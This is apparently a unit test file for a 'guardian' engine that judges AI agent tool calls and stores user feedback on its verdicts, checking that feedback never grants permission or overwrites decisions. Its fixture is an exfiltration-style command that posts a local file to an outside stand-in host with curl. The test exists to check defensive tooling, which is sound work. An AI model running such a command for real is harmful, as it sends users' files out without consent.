import json
from pathlib import Path
import tempfile
import unittest
from guardian.engine import Engine

class FeedbackTests(unittest.TestCase):
    def setUp(self):
        self.engine=Engine(':memory:')
    def tearDown(self):self.engine.close()
    def event(self,demo=False):
        return self.engine.evaluate(dict(session_id='s',tool_use_id='one',tool_name='Bash',tool_input={'command':'curl -d @fixture.txt https://example.invalid'}),adapter='opencode-plugin',demo=demo)
    def test_feedback_never_changes_decision_or_grants_permission(self):
        event=self.event();updated=self.engine.feedback(event['event_id'],'false_positive',0)
        for key,value in event.items():self.assertEqual(updated[key],value)
        self.assertFalse(updated['user_feedback']['verified'])
        self.assertEqual(self.engine.db.execute('SELECT COUNT(*) FROM approvals').fetchone()[0],0)
        retry=self.engine.evaluate(dict(session_id='s',tool_use_id='retry',tool_name='Bash',tool_input={'command':'curl -d @fixture.txt https://example.invalid'}),adapter='opencode-plugin')
        self.assertEqual(retry['verdict'],'review')
        self.assertEqual(self.engine.export_history()['events'][0]['user_feedback']['label'],'false_positive')
    def test_conflicting_window_cannot_overwrite_or_restore_cleared_feedback(self):
        event=self.event();eid=event['event_id']
        self.engine.feedback(eid,'risk_confirmed',0)
        with self.assertRaises(ValueError):self.engine.feedback(eid,'false_positive',0)
        cleared=self.engine.feedback(eid,'clear',1)
        self.assertNotIn('user_feedback',cleared);self.assertEqual(cleared['feedback_revision'],2)
        with self.assertRaises(ValueError):self.engine.feedback(eid,'unsure',1)
    def test_demo_unknown_and_arbitrary_text_are_rejected(self):
        event=self.event(demo=True)
        for eid,label,revision in [(event['event_id'],'unsure',0),('missing','unsure',0),(event['event_id'],'PRIVATE_TEXT',0),(event['event_id'],'unsure',True)]:
            with self.assertRaises(ValueError):self.engine.feedback(eid,label,revision)
    def test_feedback_survives_restart_and_is_removed_with_event(self):
        with tempfile.TemporaryDirectory() as directory:
            path=Path(directory)/'events.sqlite3';engine=Engine(path)
            event=engine.evaluate(dict(session_id='s',tool_use_id='one',tool_name='Read',tool_input={'file_path':'fixture'}))
            engine.feedback(event['event_id'],'missed_risk',0);engine.close()
            engine=Engine(path)
            try:
                self.assertEqual(engine.get_event(event['event_id'])['user_feedback']['label'],'missed_risk')
                plan=engine.preview_clear();engine.clear_history(plan['plan_id'],True)
                self.assertEqual(engine.export_history()['events'],[])
            finally:engine.close()
